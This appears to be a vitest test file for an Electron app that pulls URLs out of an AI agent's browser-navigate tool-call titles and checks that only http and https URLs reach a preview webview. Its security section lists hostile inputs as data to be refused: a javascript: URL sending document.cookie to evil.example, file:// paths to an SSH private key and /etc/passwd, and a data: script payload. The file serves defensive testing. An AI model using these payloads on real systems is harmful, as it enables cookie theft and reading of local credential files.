/**
 * @license
 * Copyright 2025 AionUi (aionui.com)
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * B1 (CEVE-1821) — EVE's browser arm, made visible.
 *
 * THE GAP: the URL-preview lane is fully built and had zero producers.
 * `PreviewPanel` renders `<URLViewer>` for `content_type === 'url'`, `URLViewer`
 * delegates to a real Electron `<webview>`, `PreviewContext` listens for
 * `preview.open` — and nothing in the renderer ever passed `'url'`. Meanwhile the
 * ACP lane carries the browser tools, so EVE has been browsing where nobody could
 * watch.
 *
 * WHERE THE URL IS, MEASURED: the wheel builds the tool-call title as
 * `f"navigate: {args.get('url', '?')}"` (acp_adapter/tools.py:171-172), and that
 * title is the second positional of `acp.start_tool_call`, so it arrives as
 * `update.title` — the field the renderer already reads (useAcpMessage.ts:147).
 * The alternatives were ruled out rather than ignored: `raw_input` is `None` for
 * tool starts (tools.py:1069) and `extract_locations` only emits a filesystem
 * `path` (tools.py:1338-1347), which browser_navigate has none of.
 *
 * THE SCHEME CHECK IS THE POINT OF THIS FILE. Whatever survives this parser is
 * handed to a real webview, so the rejections below are a security boundary and
 * are tested as one.
 */

import { describe, expect, it } from 'vitest';
import {
  collectBrowserNavigationFromToolCallUpdate,
  isDisplayableBrowserUrl,
  shouldOpenBrowserPreview,
} from '@/common/config/browserNavigationBindCore';

/** The shape the wheel actually puts on the wire for a browser_navigate start. */
const navigateUpdate = (title: string, over: Record<string, unknown> = {}) => ({
  sessionUpdate: 'tool_call',
  tool_call_id: 'call-1',
  kind: 'fetch',
  status: 'in_progress',
  title,
  ...over,
});

describe('the happy path — the title the wheel really writes', () => {
  it('reads the url out of `navigate: <url>`', () => {
    expect(collectBrowserNavigationFromToolCallUpdate(navigateUpdate('navigate: https://example.com/page'))).toEqual({
      toolCallId: 'call-1',
      url: 'https://example.com/page',
      title: 'navigate: https://example.com/page',
    });
  });

  it('accepts http as well as https — a local dev server is a legitimate target', () => {
    expect(collectBrowserNavigationFromToolCallUpdate(navigateUpdate('navigate: http://localhost:3000/'))?.url).toBe(
      'http://localhost:3000/'
    );
    expect(collectBrowserNavigationFromToolCallUpdate(navigateUpdate('navigate: https://example.com'))?.url).toBe(
      'https://example.com/'
    );
  });

  it('accepts the camelCase tool-call id spelling too', () => {
    const update = { title: 'navigate: https://example.com', toolCallId: 'call-2' };
    expect(collectBrowserNavigationFromToolCallUpdate(update)?.toolCallId).toBe('call-2');
  });
});

describe('SECURITY BOUNDARY — only web schemes reach the webview', () => {
  const forbidden: Array<[string, string]> = [
    ['file:', 'navigate: file:///Users/mathias/.ssh/id_rsa'],
    ['javascript:', 'navigate: javascript:fetch("https://evil.example/"+document.cookie)'],
    ['data:', 'navigate: data:text/html,<script>alert(1)</script>'],
    ['about:', 'navigate: about:blank'],
    ['chrome:', 'navigate: chrome://settings'],
    ['ftp:', 'navigate: ftp://example.com/x'],
  ];

  it.each(forbidden)('refuses %s', (_scheme, title) => {
    // A model that can name a scheme can name this one. `file:` would turn a tool
    // call into a local-file read inside our own renderer; `javascript:`/`data:`
    // are script execution. These are refusals, not edge cases.
    expect(collectBrowserNavigationFromToolCallUpdate(navigateUpdate(title))).toBeUndefined();
  });

  it('the predicate agrees with the parser, so neither can drift alone', () => {
    expect(isDisplayableBrowserUrl('https://example.com')).toBe(true);
    expect(isDisplayableBrowserUrl('http://example.com')).toBe(true);
    for (const bad of ['file:///etc/passwd', 'javascript:alert(1)', 'data:text/html,x', 'not a url', '', '   ']) {
      expect(isDisplayableBrowserUrl(bad), bad).toBe(false);
    }
    expect(isDisplayableBrowserUrl(undefined)).toBe(false);
    expect(isDisplayableBrowserUrl(42)).toBe(false);
  });
});

describe('every miss is `undefined`, never a throw and never a guess', () => {
  it('a different tool is not a navigation', () => {
    for (const title of ['browser snapshot', 'terminal: ls -la', 'read: /tmp/x', 'browser vision: what is this']) {
      expect(collectBrowserNavigationFromToolCallUpdate(navigateUpdate(title))).toBeUndefined();
    }
  });

  it('the wheel `?` placeholder means the model omitted the url — not a page', () => {
    // `f"navigate: {args.get('url', '?')}"` writes this when `url` is absent.
    //
    // HONEST NOTE ON WHAT THIS PINS: `?` is not a parseable URL, so the scheme
    // check alone already refuses it — deleting the explicit placeholder guard in
    // the parser leaves this assertion green. Measured, not assumed: that
    // sabotage was run. The guard stays because it states the wheel's contract at
    // the point where a reader needs it, but the line below is NOT what holds it
    // in place, and pretending otherwise would be exactly the kind of green gate
    // that guards nothing.
    expect(collectBrowserNavigationFromToolCallUpdate(navigateUpdate('navigate: ?'))).toBeUndefined();
    expect(collectBrowserNavigationFromToolCallUpdate(navigateUpdate('navigate: '))).toBeUndefined();
  });

  it('a missing tool-call id is a miss', () => {
    expect(collectBrowserNavigationFromToolCallUpdate({ title: 'navigate: https://example.com' })).toBeUndefined();
    expect(
      collectBrowserNavigationFromToolCallUpdate(navigateUpdate('navigate: https://example.com', { tool_call_id: '' }))
    ).toBeUndefined();
  });

  it('a malformed payload is a miss, in every shape', () => {
    for (const junk of [undefined, null, 'a string', 42, [], [{ title: 'navigate: https://example.com' }], {}]) {
      expect(collectBrowserNavigationFromToolCallUpdate(junk)).toBeUndefined();
    }
    expect(collectBrowserNavigationFromToolCallUpdate(navigateUpdate('' as string, { title: 42 }))).toBeUndefined();
  });
});

describe('dedupe — one page visit is one panel open', () => {
  it('does not re-open for the same url', () => {
    // A visit is one navigate followed by snapshots, clicks and scrolls. Opening
    // again for each would yank the panel out from under a reading user.
    expect(shouldOpenBrowserPreview('https://example.com/a', undefined)).toBe(true);
    expect(shouldOpenBrowserPreview('https://example.com/a', 'https://example.com/a')).toBe(false);
  });

  it('DOES re-open for a new url — that is a real navigation', () => {
    expect(shouldOpenBrowserPreview('https://example.com/b', 'https://example.com/a')).toBe(true);
  });

  it('refuses to open a non-web url even when it is new', () => {
    expect(shouldOpenBrowserPreview('file:///etc/passwd', 'https://example.com/a')).toBe(false);
  });
});
